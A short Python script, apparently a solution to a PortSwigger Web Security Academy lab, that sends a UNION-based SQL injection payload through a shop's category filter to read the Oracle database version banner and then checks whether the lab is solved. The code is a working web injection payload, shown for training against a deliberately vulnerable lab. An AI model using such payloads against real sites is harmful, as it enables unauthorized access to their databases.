#https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
from utils import *

url='https://0ac0004d047c4c0682aa3d96007200c5.web-security-academy.net/'
payload="filter?category=' or 1=1 union select banner,NULL from v$version--"
exploit=f'{url}{payload}'

response=requests.get(exploit)
soup = BeautifulSoup(response.content, 'html.parser')
print(check_succes(soup))